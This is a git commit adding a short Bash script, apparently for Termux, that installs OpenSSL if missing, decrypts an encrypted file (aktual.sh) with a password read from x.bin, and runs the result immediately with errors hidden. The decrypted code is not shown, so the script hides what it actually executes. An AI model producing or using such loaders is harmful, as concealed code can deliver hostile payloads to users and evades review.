0cfe0e67e3c75f9ddf65d3b5922ef1b38b0d6435
Inpoina <140089365+Inpoina@users.noreply.github.com>
2024-05-15 00:31:12 +0700

    Add files via upload

---
+++ kampret.sh
@@ -0,0 +1,20 @@
+#!/bin/bash
+
+
+if command -v openssl &> /dev/null
+then
+    echo "installed"
+else
+    pkg install openssl -y
+    if command -v openssl &> /dev/null
+    then
+        echo "OpenSSL berhasil diinstal."
+    else
+        echo "Gagal menginstal OpenSSL."
+    fi
+fi
+
+
+x=$(<x.bin)
+openssl enc -d -aes-256-cbc -in aktual.sh -out final.sh -pass pass:"$x" 2>/dev/null && bash final.sh
+
